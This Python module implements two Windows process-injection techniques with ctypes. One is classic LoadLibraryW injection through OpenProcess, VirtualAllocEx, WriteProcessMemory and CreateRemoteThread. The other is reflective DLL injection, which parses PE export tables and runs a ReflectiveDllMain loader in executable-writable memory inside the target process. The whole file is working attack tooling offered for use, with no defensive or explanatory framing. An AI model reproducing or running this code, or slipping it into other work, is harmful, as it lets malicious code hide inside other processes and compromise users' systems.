"""
DLL Injection — reflective DLL injection and classic LoadLibrary injection
into a target process using Windows APIs.
"""
from __future__ import annotations
import ctypes
import ctypes.wintypes
import os
import sys
from typing import Optional

if sys.platform != "win32":
    raise ImportError("inject requires Windows")

k32 = ctypes.windll.kernel32
nt  = ctypes.windll.ntdll

PROCESS_ALL_ACCESS       = 0x1F0FFF
MEM_COMMIT               = 0x1000
MEM_RESERVE              = 0x2000
PAGE_EXECUTE_READWRITE   = 0x40
PAGE_READWRITE           = 0x04

# ── Process utilities ─────────────────────────────────────────────────────────

def _open_process(pid: int) -> int:
    h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h:
        raise OSError(f"OpenProcess failed for PID {pid}: error {k32.GetLastError()}")
    return h

def _alloc_remote(hproc: int, size: int, prot: int = PAGE_READWRITE) -> int:
    addr = k32.VirtualAllocEx(hproc, None, size, MEM_COMMIT | MEM_RESERVE, prot)
    if not addr:
        raise OSError(f"VirtualAllocEx failed: error {k32.GetLastError()}")
    return addr

def _write_remote(hproc: int, addr: int, data: bytes) -> None:
    written = ctypes.c_size_t(0)
    if not k32.WriteProcessMemory(hproc, ctypes.c_void_p(addr), data, len(data), ctypes.byref(written)):
        raise OSError(f"WriteProcessMemory failed: error {k32.GetLastError()}")

def _create_remote_thread(hproc: int, start_addr: int, arg: int) -> int:
    tid = ctypes.wintypes.DWORD(0)
    FUNCTYPE = ctypes.WINFUNCTYPE(ctypes.wintypes.HANDLE, ctypes.wintypes.HANDLE,
                                   ctypes.c_void_p, ctypes.c_void_p,
                                   ctypes.c_void_p, ctypes.wintypes.DWORD,
                                   ctypes.POINTER(ctypes.wintypes.DWORD))
    hthread = k32.CreateRemoteThread(hproc, None, 0, ctypes.c_void_p(start_addr),
                                     ctypes.c_void_p(arg), 0, ctypes.byref(tid))
    if not hthread:
        raise OSError(f"CreateRemoteThread failed: error {k32.GetLastError()}")
    return hthread

# ── Classic LoadLibrary injection ─────────────────────────────────────────────

def loadlibrary_inject(pid: int, dll_path: str) -> int:
    """
    Classic injection: write DLL path to target process memory, then create
    a remote thread at LoadLibraryW. Returns thread handle.
    """
    dll_path = os.path.abspath(dll_path)
    path_bytes = (dll_path + "\x00").encode("utf-16-le")

    hproc  = _open_process(pid)
    remote = _alloc_remote(hproc, len(path_bytes))
    _write_remote(hproc, remote, path_bytes)

    loadlib = k32.GetProcAddress(k32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
    if not loadlib:
        raise OSError("Could not resolve LoadLibraryW")

    hthread = _create_remote_thread(hproc, loadlib, remote)
    print(f"[INJECT] LoadLibraryW injection into PID {pid} — thread handle 0x{hthread:X}")
    k32.CloseHandle(hproc)
    return hthread

# ── Reflective DLL injection ──────────────────────────────────────────────────

_REFLECTIVE_LOADER_EXPORT = b"ReflectiveDllMain"

def _find_reflective_loader_rva(dll_bytes: bytes) -> Optional[int]:
    """Locate the ReflectiveDllMain export RVA in the DLL bytes."""
    import struct
    try:
        e_lfanew = struct.unpack_from("<I", dll_bytes, 0x3C)[0]
        machine  = struct.unpack_from("<H", dll_bytes, e_lfanew + 4)[0]
        is64     = machine == 0x8664
        opt_off  = e_lfanew + 24
        dd_off   = opt_off + (112 if is64 else 96)
        exp_rva  = struct.unpack_from("<I", dll_bytes, dd_off)[0]
        if not exp_rva:
            return None
        num_sections = struct.unpack_from("<H", dll_bytes, e_lfanew + 6)[0]
        sh_off = opt_off + struct.unpack_from("<H", dll_bytes, e_lfanew + 20)[0]

        def r2o(rva: int) -> int:
            for i in range(num_sections):
                s   = sh_off + i * 40
                va  = struct.unpack_from("<I", dll_bytes, s + 12)[0]
                vsz = struct.unpack_from("<I", dll_bytes, s + 16)[0]
                raw = struct.unpack_from("<I", dll_bytes, s + 20)[0]
                if va <= rva < va + vsz:
                    return raw + (rva - va)
            return rva

        eoff     = r2o(exp_rva)
        nfuncs   = struct.unpack_from("<I", dll_bytes, eoff + 20)[0]
        nnames   = struct.unpack_from("<I", dll_bytes, eoff + 24)[0]
        addr_tbl = r2o(struct.unpack_from("<I", dll_bytes, eoff + 28)[0])
        name_tbl = r2o(struct.unpack_from("<I", dll_bytes, eoff + 32)[0])
        ord_tbl  = r2o(struct.unpack_from("<I", dll_bytes, eoff + 36)[0])

        for i in range(nnames):
            n_rva = struct.unpack_from("<I", dll_bytes, name_tbl + i * 4)[0]
            n_off = r2o(n_rva)
            end   = dll_bytes.index(b"\x00", n_off)
            name  = dll_bytes[n_off:end]
            if name == _REFLECTIVE_LOADER_EXPORT:
                ordi     = struct.unpack_from("<H", dll_bytes, ord_tbl + i * 2)[0]
                func_rva = struct.unpack_from("<I", dll_bytes, addr_tbl + ordi * 4)[0]
                return func_rva
    except Exception:
        pass
    return None

def reflective_inject(pid: int, dll_path: str) -> int:
    """
    Reflective DLL injection: write the entire DLL into the target process,
    find the ReflectiveDllMain export, and execute it as the thread start.
    The DLL must export 'ReflectiveDllMain' (built with a reflective loader).
    Returns thread handle.
    """
    with open(dll_path, "rb") as f:
        dll_bytes = f.read()

    loader_rva = _find_reflective_loader_rva(dll_bytes)
    if loader_rva is None:
        raise ValueError(f"DLL does not export '{_REFLECTIVE_LOADER_EXPORT.decode()}' — not a reflective DLL")

    hproc  = _open_process(pid)
    remote = _alloc_remote(hproc, len(dll_bytes), PAGE_EXECUTE_READWRITE)
    _write_remote(hproc, remote, dll_bytes)

    loader_addr = remote + loader_rva
    hthread = _create_remote_thread(hproc, loader_addr, remote)
    print(f"[INJECT] Reflective injection into PID {pid} — loader @ 0x{loader_addr:016X}, thread 0x{hthread:X}")
    k32.CloseHandle(hproc)
    return hthread
